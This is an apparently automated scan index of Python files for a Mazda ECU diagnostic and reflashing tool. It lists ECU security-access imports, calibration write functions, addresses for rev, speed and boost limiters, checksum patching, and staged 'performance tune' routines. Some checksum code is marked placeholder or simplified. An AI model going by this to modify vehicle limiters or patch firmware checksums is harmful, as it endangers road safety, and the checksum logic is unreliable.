"self.j2534_interface = J2534Interface()"}, {"type": "protocol", "line": 57, "protocol": "J2534", "content": "\"\"\"Connect to vehicle using J2534 interface\"\"\""}, {"type": "protocol", "line": 63, "protocol": "J2534", "content": "logger.error(\"Failed to connect J2534 device\")"}, {"type": "protocol", "line": 68, "protocol": "J2534", "content": "protocol=self.j2534_interface.J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 143, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_info = self.diagnostic_protocol.read_dtc_information(0x02)  # Read by status"}, {"type": "protocol", "line": 210, "protocol": "PID", "content": "\"\"\"Decode PID value based on PID definition\"\"\""}, {"type": "protocol", "line": 232, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0xFFA000,  # Start of calibration area"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "length=0x8000  # Typical calibration size"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data, start_address=0xFFA000"}, {"type": "protocol", "line": 286, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data, start_address=0xFFA000"}, {"type": "protocol", "line": 349, "protocol": "CAN", "content": "'protocol': 'ISO15765 CAN'"}, {"type": "protocol", "line": 425, "protocol": "PID", "content": "print(f\"  PID {pid}: {data['decoded_value']}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Complete diagnostic and programming system for Mazda vehicles"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "self.security_access = MazdaSecurityAccess()"}, {"type": "hardware", "line": 38, "hardware": "vehicle", "content": "self.vehicle_connected = False"}, {"type": "hardware", "line": 39, "hardware": "vehicle", "content": "self.current_vehicle_info = {}"}, {"type": "hardware", "line": 56, "hardware": "vehicle", "content": "def connect_to_vehicle(self) -> bool:"}, {"type": "hardware", "line": 57, "hardware": "vehicle", "content": "\"\"\"Connect to vehicle using J2534 interface\"\"\""}, {"type": "hardware", "line": 59, "hardware": "vehicle", "content": "logger.info(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 71, "hardware": "vehicle", "content": "logger.error(\"Failed to connect to vehicle channel\")"}, {"type": "hardware", "line": 78, "hardware": "vehicle", "content": "if not self.diagnostic_protocol.connect_to_vehicle():"}, {"type": "hardware", "line": 79, "hardware": "vehicle", "content": "logger.error(\"Failed to establish vehicle communication\")"}, {"type": "hardware", "line": 83, "hardware": "vehicle", "content": "vehicle_info = self.read_vehicle_information()"}, {"type": "hardware", "line": 84, "hardware": "vehicle", "content": "if vehicle_info:"}, {"type": "hardware", "line": 85, "hardware": "vehicle", "content": "self.current_vehicle_info = vehicle_info"}, {"type": "hardware", "line": 86, "hardware": "vehicle", "content": "logger.info(f\"Connected to vehicle: {vehicle_info.get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 87, "hardware": "vehicle", "content": "self.vehicle_connected = True"}, {"type": "hardware", "line": 90, "hardware": "vehicle", "content": "logger.error(\"Failed to read vehicle information\")"}, {"type": "hardware", "line": 94, "hardware": "vehicle", "content": "logger.error(f\"Error connecting to vehicle: {e}\")"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "def read_vehicle_information(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 98, "hardware": "vehicle", "content": "\"\"\"Read complete vehicle information\"\"\""}, {"type": "hardware", "line": 100, "hardware": "vehicle", "content": "vehicle_info = {}"}, {"type": "hardware", "line": 110, "hardware": "vehicle", "content": "vehicle_info['vin'] = vin_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "vehicle_info['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 115, "hardware": "vehicle", "content": "vehicle_info['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 120, "hardware": "vehicle", "content": "vehicle_info['calibration_id'] = cal_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 125, "hardware": "vehicle", "content": "vehicle_info['software_version'] = sw_data.hex().upper()"}, {"type": "hardware", "line": 127, "hardware": "vehicle", "content": "return vehicle_info if vehicle_info else None"}, {"type": "hardware", "line": 130, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle information: {e}\")"}, {"type": "hardware", "line": 136, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 137, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 164, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 165, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 186, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 187, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "def read_ecu_calibration(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "\"\"\"Read current ECU calibration\"\"\""}, {"type": "hardware", "line": 218, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 219, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "logger.info(\"Reading ECU calibration...\")"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "logger.error(f\"Error reading ECU calibration: {e}\")"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "def program_ecu_calibration(self, calibration_data: bytes) -> bool:"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "\"\"\"Program new calibration to ECU\"\"\""}, {"type": "hardware", "line": 260, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 261, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "logger.info(\"Programming ECU calibration...\")"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "logger.info(\"ECU calibration programmed successfully\")"}, {"type": "hardware", "line": 297, "hardware": "ECU", "content": "self.programming_service.reset_ecu()"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "logger.error(f\"Error programming ECU calibration: {e}\")"}, {"type": "hardware", "line": 303, "hardware": "ECU", "content": "def perform_ecu_reset(self) -> bool:"}, {"type": "hardware", "line": 304, "hardware": "ECU", "content": "\"\"\"Perform ECU reset\"\"\""}, {"type": "hardware", "line": 306, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 307, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "logger.info(\"Performing ECU reset...\")"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "result = self.programming_service.reset_ecu()"}, {"type": "hardware", "line": 315, "hardware": "ECU", "content": "logger.info(\"ECU reset completed successfully\")"}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "logger.error(\"ECU reset failed\")"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "logger.error(f\"Error performing ECU reset: {e}\")"}, {"type": "hardware", "line": 328, "hardware": "vehicle", "content": "'vehicle_information': self.current_vehicle_info,"}, {"type": "hardware", "line": 329, "hardware": "vehicle", "content": "'connection_status': self.vehicle_connected,"}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "'communication_quality': 'Good' if self.vehicle_connected else 'Poor',"}, {"type": "hardware", "line": 348, "hardware": "vehicle", "content": "'voltage': self.j2534_interface.read_vehicle_voltage(),"}, {"type": "hardware", "line": 359, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle and cleanup\"\"\""}, {"type": "hardware", "line": 361, "hardware": "vehicle", "content": "if self.vehicle_connected:"}, {"type": "hardware", "line": 363, "hardware": "vehicle", "content": "self.vehicle_connected = False"}, {"type": "hardware", "line": 364, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 372, "hardware": "vehicle", "content": "parser.add_argument('--connect', action='store_true', help='Connect to vehicle')"}, {"type": "hardware", "line": 377, "hardware": "ECU", "content": "parser.add_argument('--read-calibration', action='store_true', help='Read ECU calibration')"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "parser.add_argument('--reset-ecu', action='store_true', help='Reset ECU')"}, {"type": "hardware", "line": 387, "hardware": "vehicle", "content": "if software.connect_to_vehicle():"}, {"type": "hardware", "line": 388, "hardware": "vehicle", "content": "print(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 390, "hardware": "vehicle", "content": "print(\"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 395, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 407, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 408, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 417, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 418, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 428, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 429, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 434, "hardware": "vehicle", "content": "print(f\"VIN: {report['vehicle_information'].get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 435, "hardware": "vehicle", "content": "print(f\"Calibration: {report['vehicle_information'].get('calibration_id', 'Unknown')}\")"}, {"type": "hardware", "line": 442, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 443, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "calibration = software.read_ecu_calibration()"}, {"type": "hardware", "line": 453, "hardware": "ECU", "content": "if args.reset_ecu:"}, {"type": "hardware", "line": 454, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 455, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "if software.perform_ecu_reset():"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "print(\"ECU reset completed\")"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "print(\"ECU reset failed\")"}], "security_logic": [{"type": "security_pattern", "line": 15, "pattern": "algorithm", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "security_pattern", "line": 15, "pattern": "security_access", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "security_pattern", "line": 32, "pattern": "security_access", "content": "self.security_access = MazdaSecurityAccess()"}, {"type": "security_pattern", "line": 340, "pattern": "key", "content": "key_pids = ['010C', '010D', '0104', '0105', '0111']  # RPM, Speed, Load, Coolant Temp, Throttle"}, {"type": "security_pattern", "line": 341, "pattern": "key", "content": "live_data = self.read_live_data(key_pids)"}, {"type": "security_pattern", "line": 463, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds8.py", "lines_read": 841, "features_found": [{"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "set_calibration_database", "line": 55}, {"type": "function", "name": "read_full_calibration", "line": 59}, {"type": "function", "name": "_read_calibration_identification", "line": 104}, {"type": "function", "name": "_read_all_calibration_maps", "line": 135}, {"type": "function", "name": "_decode_calibration_map", "line": 180}, {"type": "function", "name": "_read_calibration_parameters", "line": 227}, {"type": "function", "name": "write_calibration", "line": 252}, {"type": "function", "name": "_write_calibration_map", "line": 301}, {"type": "function", "name": "_write_calibration_parameters", "line": 320}, {"type": "function", "name": "_update_calibration_checksum", "line": 346}, {"type": "function", "name": "_calculate_ecu_checksum", "line": 364}, {"type": "function", "name": "modify_calibration_map", "line": 369}, {"type": "function", "name": "_apply_map_adjustments", "line": 401}, {"type": "function", "name": "_interpolate_map", "line": 440}, {"type": "function", "name": "_encode_calibration_map", "line": 447}, {"type": "function", "name": "_calculate_calibration_checksum", "line": 486}, {"type": "function", "name": "_calculate_map_checksum", "line": 504}, {"type": "function", "name": "validate_calibration", "line": 508}, {"type": "function", "name": "_validate_calibration_map", "line": 559}, {"type": "function", "name": "_validate_calibration_parameters", "line": 603}, {"type": "function", "name": "_perform_safety_checks", "line": 633}, {"type": "function", "name": "generate_performance_tune", "line": 665}, {"type": "function", "name": "_create_performance_tune", "line": 702}, {"type": "function", "name": "_apply_stage1_modifications", "line": 723}, {"type": "function", "name": "_apply_stage2_modifications", "line": 737}, {"type": "function", "name": "_apply_stage3_modifications", "line": 752}, {"type": "function", "name": "create_calibration_backup", "line": 770}, {"type": "function", "name": "restore_calibration_backup", "line": 809}, {"type": "function", "name": "_get_current_timestamp", "line": 838}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}], "components_found": [{"type": "class", "name": "CalibrationOperation", "line": 19}, {"type": "class", "name": "MapAdjustmentType", "line": 29}, {"type": "class", "name": "MapAdjustment", "line": 37}, {"type": "class", "name": "MazdaCalibrationService", "line": 44}], "algorithms": [{"type": "algorithm_function", "line": 364, "content": "def _calculate_ecu_checksum(self) -> int:"}, {"type": "algorithm_function", "line": 486, "content": "def _calculate_calibration_checksum(self, calibration_data: Dict[str, Any]) -> str:"}, {"type": "algorithm_function", "line": 504, "content": "def _calculate_map_checksum(self, map_data: bytes) -> str:"}], "protocols": [{"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_CALIBRATION = 0x01"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "WRITE_CALIBRATION = 0x02"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "VERIFY_CALIBRATION = 0x03"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "MODIFY_MAP = 0x04"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ADJUST_PARAMETER = 0x05"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "GENERATE_CHECKSUM = 0x06"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "VALIDATE_CALIBRATION = 0x07"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "OFFSET = 0x01"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "SCALING = 0x02"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "INTERPOLATION = 0x03"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "CUSTOM = 0x04"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "def read_full_calibration(self, ecu_address: int = 0x7E0) -> Optional[Dict[str, Any]]:"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': 0xFFB800,"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': 0xFFB810,"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_limit': 0xFFB820,"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "'launch_control_rpm': 0xFFB830"}, {"type": "protocol", "line": 325, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': 0xFFB800,"}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': 0xFFB810,"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_limit': 0xFFB820"}, {"type": "protocol", "line": 351, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address = 0xFFFFF0  # Typical checksum location"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0x12345678  # Placeholder"}], "hardware_assumptions": [{"type": "hardware", "line": 59, "hardware": "ECU", "content": "def read_full_calibration(self, ecu_address: int = 0x7E0) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "Read complete calibration from ECU"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "ecu_address: ECU address to read from"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "logger.info(\"Reading full ECU calibration...\")"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "identification['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "\"\"\"Read all calibration maps from ECU\"\"\""}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "\"\"\"Read calibration parameters from ECU\"\"\""}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "Write calibration data to ECU"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "logger.info(\"Writing calibration to ECU...\")"}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "\"\"\"Write single calibration map to ECU\"\"\""}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "\"\"\"Write calibration parameters to ECU\"\"\""}, {"type": "hardware", "line": 347, "hardware": "ECU", "content": "\"\"\"Update calibration checksum in ECU\"\"\""}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "new_checksum = self._calculate_ecu_checksum()"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "def _calculate_ecu_checksum(self) -> int:"}, {"type": "hardware", "line": 365, "hardware": "ECU", "content": "\"\"\"Calculate ECU checksum (simplified implementation)\"\"\""}, {"type": "hardware", "line": 793, "hardware": "vehicle", "content": "'vehicle_vin': current_calibration.get('identification', {}).get('vin', 'Unknown'),"}], "security_logic": [{"type": "security_pattern", "line": 10, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 497, "pattern": "hash", "content": "checksum = hashlib.sha256(combined_data).hexdigest()"}, {"type": "security_pattern", "line": 506, "pattern": "hash", "content": "return hashlib.md5(map_data).hexdigest()"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds9.py", "lines_read": 258, "features_found": [{"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "calculate_checksum", "line": 41}, {"type": "function", "name": "_calculate_simple_sum", "line": 70}, {"type": "function", "name": "_calculate_crc16", "line": 78}, {"type": "function", "name": "_calculate_crc32", "line": 92}, {"type": "function", "name": "_calculate_mazda_proprietary", "line": 105}, {"type": "function", "name": "_calculate_bootloader_checksum", "line": 115}, {"type": "function", "name": "_calculate_calibration_checksum", "line": 126}, {"type": "function", "name": "verify_checksum", "line": 140}, {"type": "function", "name": "calculate_ecu_checksum", "line": 165}, {"type": "function", "name": "_calculate_l3k9_checksum", "line": 191}, {"type": "function", "name": "_calculate_lf9a_checksum", "line": 204}, {"type": "function", "name": "patch_checksum", "line": 215}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "ChecksumType", "line": 16}, {"type": "class", "name": "MazdaChecksumCalculator", "line": 25}], "algorithms": [{"type": "algorithm_function", "line": 41, "content": "def calculate_checksum(self, data: bytes, checksum_type: ChecksumType,"}, {"type": "algorithm_function", "line": 70, "content": "def _calculate_simple_sum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 78, "content": "def _calculate_crc16(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 92, "content": "def _calculate_crc32(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 105, "content": "def _calculate_mazda_proprietary(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 115, "content": "def _calculate_bootloader_checksum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 126, "content": "def _calculate_calibration_checksum(self, data: bytes, start_address: int = 0,"}, {"type": "algorithm_function", "line": 165, "content": "def calculate_ecu_checksum(self, ecu_data: bytes, ecu_type: str) -> int:"}, {"type": "algorithm_function", "line": 191, "content": "def _calculate_l3k9_checksum(self, ecu_data: bytes) -> int:"}, {"type": "algorithm_function", "line": 204, "content": "def _calculate_lf9a_checksum(self, ecu_data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "SIMPLE_SUM = 0x01"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "CRC16 = 0x02"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "CRC32 = 0x03"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "MAZDA_PROPRIETARY = 0x04"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER_CHECKSUM = 0x05"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "CALIBRATION_CHECKSUM = 0x06"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFF"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = 0xFFFF"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "if crc & 0x8000:"}, {"type": "protocol", "line": 86, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = (crc << 1) ^ 0x1021"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "crc &= 0xFFFF"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = 0xFFFFFFFF"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "crc = (crc >> 1) ^ 0xEDB88320"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "return crc ^ 0xFFFFFFFF"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte + i) & 0xFFFF"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = ((checksum << 3) | (checksum >> 13)) & 0xFFFF"}, {"type": "protocol", "line": 119, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = 0xA5A5"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = ((checksum << 1) | (checksum >> 15)) & 0xFFFF"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + 0x1234) & 0xFFFF"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "block_sum = sum(block) & 0xFFFF"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + block_sum) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = 0x12345678"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "return checksum & 0xFFFFFFFF"}, {"type": "protocol", "line": 210, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte * 0x13) & 0xFFFFFFFF"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "patched_data[checksum_address:checksum_address+2] = struct.pack('>H', checksum & 0xFFFF)"}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "patched_data[checksum_address] = checksum & 0xFF"}], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "Implements all checksum algorithms used in Mazda ECUs"}, {"type": "hardware", "line": 165, "hardware": "ECU", "content": "def calculate_ecu_checksum(self, ecu_data: bytes, ecu_type: str) -> int:"}, {"type": "hardware", "line": 167, "hardware": "ECU", "content": "Calculate complete ECU checksum based on ECU type"}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "ecu_data: Complete ECU data"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "ecu_type: ECU type identifier"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "ECU checksum"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "if ecu_type.startswith(\"L3K9\"):"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "return self._calculate_l3k9_checksum(ecu_data)"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "elif ecu_type.startswith(\"LF9A\"):"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "return self._calculate_lf9a_checksum(ecu_data)"}, {"type": "hardware", "line": 185, "hardware": "ECU", "content": "return self._calculate_mazda_proprietary(ecu_data)"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "logger.error(f\"Error calculating ECU checksum: {e}\")"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "def _calculate_l3k9_checksum(self, ecu_data: bytes) -> int:"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "\"\"\"Calculate checksum for L3K9 series ECUs\"\"\""}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "for i in range(0, len(ecu_data), 4):"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "if i + 4 <= len(ecu_data):"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "word = struct.unpack_from('>I', ecu_data, i)[0]"}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "def _calculate_lf9a_checksum(self, ecu_data: bytes) -> int:"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "\"\"\"Calculate checksum for LF9A series ECUs\"\"\""}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "for byte in ecu_data:"}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "MAZDA CHECKSUM CALCULATOR - Complete Checksum Algorithms"}, {"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "Implements all checksum algorithms used in Mazda ECUs"}, {"type": "security_pattern", "line": 32, "pattern": "algorithm", "content": "self.checksum_algorithms = {"}, {"type": "security_pattern", "line": 44, "pattern": "algorithm", "content": "Calculate checksum for data using specified algorithm"}, {"type": "security_pattern", "line": 49, "pattern": "algorithm", "content": "start_address: Starting address (for some algorithms)"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "length: Data length (for some algorithms)"}, {"type": "security_pattern", "line": 56, "pattern": "algorithm", "content": "if checksum_type not in self.checksum_algorithms:"}, {"type": "security_pattern", "line": 60, "pattern": "algorithm", "content": "algorithm = self.checksum_algorithms[checksum_type]"}, {"type": "security_pattern", "line": 61, "pattern": "algorithm", "content": "checksum = algorithm(data, start_address, length)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mkdocs.yml", "lines_read": 12, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
